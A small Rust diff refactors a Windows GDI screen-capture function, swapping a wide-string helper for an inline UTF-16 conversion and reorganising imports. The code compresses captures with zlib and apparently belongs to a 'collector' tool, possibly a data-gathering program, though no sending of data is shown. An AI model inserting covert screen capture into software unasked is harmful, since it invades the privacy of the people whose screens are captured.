@@ -1,15 +1,15 @@
 use crate::alloc::borrow::ToOwned;
 use alloc::vec;
 use alloc::vec::Vec;
+use core::iter::once;
 use core::mem::zeroed;
 use core::ptr::null_mut;
+use filesystem::path::Path;
 use miniz_oxide::deflate::compress_to_vec_zlib;
 use tasks::{parent_name, Task};
-use utils::path::Path;
 
 use collector::Collector;
 use filesystem::{FileSystem, WriteTo};
-use utils::WideString;
 use windows_sys::Win32::Graphics::Gdi::{
     BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, CreateDCW, DeleteDC, DeleteObject,
     GetDIBits, SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY,
@@ -45,7 +45,7 @@ fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
 
     let hdc = unsafe {
         CreateDCW(
-            "DISPLAY".to_wide().as_ptr(),
+            "DISPLAY".encode_utf16().chain(once(0)).collect::<Vec<u16>>().as_ptr(),
             null_mut(),
             null_mut(),
             null_mut(),
